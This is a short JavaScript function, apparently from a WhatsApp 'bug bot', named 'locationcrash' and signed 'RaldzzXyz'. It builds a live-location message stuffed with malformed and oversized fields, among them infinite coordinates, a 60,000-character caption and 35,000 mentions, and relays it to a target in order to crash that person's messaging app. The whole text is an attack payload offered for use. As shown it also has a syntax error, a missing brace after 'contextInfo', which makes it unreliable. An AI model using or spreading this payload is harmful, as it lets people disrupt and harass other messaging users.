async function locationcrash(target) {

const imageCrash = "https://files.catbox.moe/ykvioj.jpg";

const photo = {
      image: { url: imageCrash }
    };

const msg = await generateWAMessage(target, photo, {
      upload: client.waUploadToServer
    });
    
const liveLocationCrash = {
      liveLocationMessage: {
        degreesLatitude: "Infinity",
        degreesLongitude: "-Infinity",
        accuracyInMeters: 99999999,
        speedInMps: -999,
        magneticHeading: 999,
        caption: "ꦾ".repeat(60000),
        sequenceNumber: Number.MAX_SAFE_INTEGER,
        timeOffset: 999999999999,
        contextInfo: 
          stanzaId: "X7".repeat(9999),
          mentionedJid: Array.from({ length: 35000 }, (_, i) => `${500000 + i}@s.whatsapp.net`),
          businessMessageForwardInfo: {
            businessOwnerJid: "5521992999999@s.whatsapp.net"
          },
          externalAdReply: {
            title: "ꦾ".repeat(9999),
            body: "© RaldzzXyz",
            thumbnailUrl: imageCrash,
            mediaType: 1,
            mediaUrl: "about:blank",
            sourceUrl: "about:blank"
          }
        }
      }
    };

await client.relayMessage(target, liveLocationCrash, {
      messageId: msg.key.id
    });
  }